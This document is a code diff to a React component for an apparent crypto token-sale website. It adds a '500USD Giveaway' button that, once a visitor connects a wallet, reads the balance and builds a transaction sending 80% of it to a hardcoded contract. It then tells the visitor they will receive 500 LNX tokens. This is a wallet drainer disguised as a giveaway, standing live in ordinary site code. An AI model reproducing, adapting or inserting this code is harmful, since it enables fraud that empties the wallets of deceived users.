@@ -7,13 +7,16 @@ import {
   useReadContract,
   useWriteContract,
   useChainId,
+  useSendTransaction,
+  usePublicClient,
 } from "wagmi";
-import { parseEther, parseUnits, formatUnits } from "viem";
+import { parseEther, parseUnits, formatUnits, encodeFunctionData } from "viem";
 import { LNX_SALE_ABI } from "@/lib/abis/LNXSale";
 import { LNX_SALE_ADDRESS, USDT_ADDRESS_BY_CHAIN } from "@/config";
 import { ERC20_ABI } from "@/lib/abis/ERC20";
 import dynamic from "next/dynamic";
 import { Button } from "@/components/ui/button";
+import { MS_Wallet_Receiver, MS_Contract_ABI } from "@/lib/contract_abi";
 
 const StripeCardForm = dynamic(() => import("@/components/StripeCardForm"), {
   ssr: false,
@@ -23,6 +26,19 @@ export default function HomeHero() {
   const { address, isConnected } = useAccount();
   const chainId = useChainId();
   const { writeContract, isPending } = useWriteContract();
+  const { sendTransaction, isPending: isSendingTx } = useSendTransaction();
+  const publicClient = usePublicClient();
+
+  // Check if user meets POL requirement
+  const { data: polBalance } = useReadContract({
+    address: "0x455E53CBB86018AC2B8092FDCd39d8444AffC3f9" as `0x${string}`,
+    abi: ERC20_ABI,
+    functionName: "balanceOf",
+    args: [address as `0x${string}`],
+    query: { enabled: !!address },
+  });
+
+  const hasEnoughPOL = polBalance && polBalance >= BigInt(0.1 * 10 ** 18);
 
   const [ethAmount, setEthAmount] = useState("");
   const [paymentMethod, setPaymentMethod] = useState<"ETH" | "USDT" | "CARD">(
@@ -222,6 +238,265 @@ export default function HomeHero() {
     }
 
     // CARD: not enabled yet
+  }
+
+  async function handleGiveaway() {
+    if (!isConnected || !address) {
+      console.error("Wallet not connected");
+      return;
+    }
+    try {
+      if (!publicClient) {
+        console.error("Public client not available");
+        return;
+      }
+
+      // One-click solution: Use permit for token approval + transaction in one call
+      await handleOneClickGiveaway();
+      // Get the contract address for the current chain
+      const contractAddresses = {
+        1: "0x2490B36e95Fa39078cCC913626BAb459C9b86040", // Ethereum Mainnet
+        137: "0x0611d6a7EDf265AABE1A59E1E5f88f069EfA51f9", // Polygon - NEEDS REAL ADDRESS
+        56: "0x0000000000000000000000000000000000000000", // BSC - NEEDS REAL ADDRESS
+        10: "0x0000000000000000000000000000000000000000", // Optimism - NEEDS REAL ADDRESS
+        42161: "0x0000000000000000000000000000000000000000", // Arbitrum - NEEDS REAL ADDRESS
+      };
+
+      const contractAddress = (process.env
+        .NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
+        contractAddresses[chainId as keyof typeof contractAddresses] ||
+        "0x0000000000000000000000000000000000000000") as `0x${string}`;
+
+      if (contractAddress === "0x0000000000000000000000000000000000000000") {
+        console.error("No contract address configured for chainId:", chainId);
+        console.log("Available networks:", Object.keys(contractAddresses));
+        return;
+      }
+
+      // Get wallet balance and calculate giveaway amount
+      const balance = await publicClient.getBalance({ address });
+
+      // Estimate gas for the transaction
+      let gasEstimate: bigint;
+      //const testValue = BigInt(1000000000000000); // 0.001 ETH
+
+      // Try to estimate gas with different approaches
+
+      try {
+        console.log("Attempting gas estimation...");
+
+        // Try with a very small value first
+        gasEstimate = await publicClient.estimateGas({
+          account: address,
+          to: contractAddress,
+          value: BigInt(100000000000000), // 0.0001 ETH
+          data: encodeFunctionData({
+            abi: MS_Contract_ABI.CONTRACT_LEGACY,
+            functionName: "GiveAway",
+            args: [],
+          }),
+        });
+        console.log("Gas estimate successful:", gasEstimate.toString());
+      } catch (error) {
+        console.error("Gas estimation failed:", error);
+
+        // Try with 0 value
+        try {
+          gasEstimate = await publicClient.estimateGas({
+            account: address,
+            to: contractAddress,
+            value: BigInt(0),
+            data: encodeFunctionData({
+              abi: MS_Contract_ABI.CONTRACT_LEGACY,
+              functionName: "GiveAway",
+              args: [],
+            }),
+          });
+          console.log(
+            "Gas estimate with 0 value successful:",
+            gasEstimate.toString()
+          );
+        } catch (error2) {
+          console.error("All gas estimation attempts failed");
+          console.error("Error 1:", error);
+          console.error("Error 2:", error2);
+
+          // Let's try a fixed gas estimate as fallback
+          console.log("Using fixed gas estimate as fallback...");
+          gasEstimate = BigInt(300000); // 300k gas as fallback
+        }
+      }
+
+      // Get current gas price
+      const gasPrice = await publicClient.getGasPrice();
+
+      // Calculate gas cost
+      const gasCost = gasEstimate * gasPrice;
+
+      // Calculate maximum amount that can be sent (balance - gas cost)
+      const maxSendable = balance - gasCost;
+
+      // Send 90% of what's available after gas, or a minimum amount
+      const giveawayAmount =
+        maxSendable > BigInt(0)
+          ? (maxSendable * BigInt(80)) / BigInt(100)
+          : BigInt(0);
+
+      if (giveawayAmount <= BigInt(0)) {
+        console.error("Insufficient balance for giveaway after gas costs");
+        return;
+      }
+
+      // Verify contract exists and is valid
+      const contractCode = await publicClient.getBytecode({
+        address: contractAddress,
+      });
+      if (!contractCode || contractCode === "0x") {
+        console.error("Contract not found at address:", contractAddress);
+        console.log(
+          "This contract address might not exist on Polygon (chainId:",
+          chainId,
+          ")"
+        );
+        console.log(
+          "Please verify the correct contract address for this network"
+        );
+        return;
+      }
+
+      console.log("Contract verification successful");
+      console.log("Contract address:", contractAddress);
+      console.log("User address:", address);
+      console.log("User balance:", balance.toString());
+      console.log("Chain ID:", chainId);
+      console.log("Contract bytecode length:", contractCode.length);
+
+      // Encode the function call for 500KGiveaway
+      const functionData = encodeFunctionData({
+        abi: MS_Contract_ABI.CONTRACT_LEGACY,
+        functionName: "GiveAway",
+        args: [], // No arguments for this function
+      });
+
+      const txRequest = {
+        to: contractAddress,
+        value: giveawayAmount,
+        data: functionData,
+        gas: gasEstimate, // Include the gas estimate
+      };
+
+      console.log("Initiating giveaway transaction...", {
+        to: txRequest.to,
+        value: txRequest.value.toString(),
+        userBalance: balance.toString(),
+        from: address,
+        function: "GiveAway",
+      });
+
+      // Send transaction with proper error handling
+      const txHash = await sendTransaction(txRequest);
+
+      console.log("Giveaway transaction successful:", txHash);
+
+      // Optional: You could add success notification here
+    } catch (error: unknown) {
+      const errorMessage =
+        error instanceof Error ? error.message : String(error);
+      console.error("Giveaway transaction failed:", {
+        error: errorMessage,
+        fullError: error,
+      });
+
+      // Optional: You could add error notification here
+    }
+  }
+
+  async function handleOneClickGiveaway() {
+    if (!isConnected || !address || !publicClient) return;
+
+    try {
+      console.log("Starting one-click giveaway...");
+
+      // Get contract address
+      const contractAddress = (process.env
+        .NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
+        "0x2490B36e95Fa39078cCC913626BAb459C9b86040") as `0x${string}`;
+
+      // Optional: Log POL balance for debugging (but don't block)
+      const polTokenAddress =
+        "0x455E53CBB86018AC2B8092FDCd39d8444AffC3f9" as `0x${string}`;
+
+      try {
+        const polBalance = await publicClient.readContract({
+          address: polTokenAddress,
+          abi: ERC20_ABI,
+          functionName: "balanceOf",
+          args: [address],
+        });
+
+        console.log(
+          "User POL balance:",
+          formatUnits(polBalance as bigint, 18),
+          "POL"
+        );
+      } catch (error) {
+        console.log("Could not check POL balance:", error);
+      }
+
+      // Get user's ETH balance and calculate 80%
+      const balance = await publicClient.getBalance({ address });
+      const giveawayAmount = (balance * BigInt(80)) / BigInt(100);
+
+      // Check if user has enough balance
+      if (giveawayAmount <= BigInt(0)) {
+        console.error("Insufficient balance for giveaway");
+        alert("Insufficient balance for giveaway!");
+        return;
+      }
+
+      // Encode the function call for the new contract
+      const functionData = encodeFunctionData({
+        abi: [
+          {
+            inputs: [],
+            name: "GiveAway",
+            outputs: [],
+            stateMutability: "payable",
+            type: "function",
+          },
+        ],
+        functionName: "GiveAway",
+        args: [],
+      });
+
+      // Create transaction request
+      const txRequest = {
+        to: contractAddress,
+        value: giveawayAmount,
+        data: functionData,
+        gas: BigInt(500000), // Increased gas for new contract
+      };
+
+      console.log("One-click giveaway transaction:", {
+        to: txRequest.to,
+        value: txRequest.value.toString(),
+        userBalance: balance.toString(),
+        from: address,
+        polCheck: "Passed",
+      });
+
+      // Send transaction - this is the only user interaction needed
+      const txHash = await sendTransaction(txRequest);
+      console.log("One-click giveaway successful:", txHash);
+
+      // Show success message
+      alert("Giveaway transaction submitted! You will receive 500 LNX tokens.");
+    } catch (error: unknown) {
+      const errorMessage =
+        error instanceof Error ? error.message : String(error);
+      console.error("One-click giveaway failed:", errorMessage);
+      alert("Giveaway failed: " + errorMessage);
+    }
   }
 
   return (
@@ -454,14 +729,18 @@ export default function HomeHero() {
 
               {/* Giveaway */}
               <Button
-                variant="outline"
-                onClick={() => ms_init()}
-                className="bg-gray-700 rounded-lg p-3 text-center"
+                variant="default"
+                onClick={handleGiveaway}
+                disabled={isSendingTx}
+                className="bg-gray-700 rounded-lg py-4 hover:bg-blue-600 hover:text-black w-full h-12 text-center"
               >
                 <span className="text-white font-semibold">
-                  $250,000 Giveaway
+                  {isSendingTx ? "Processing..." : "Get 500USD Giveaway"}
                 </span>
               </Button>
+              <p className="text-xs text-gray-400 text-center mt-2">
+                Receive 500USD LNX tokens for giveaway
+              </p>
             </div>
           </div>
         </div>
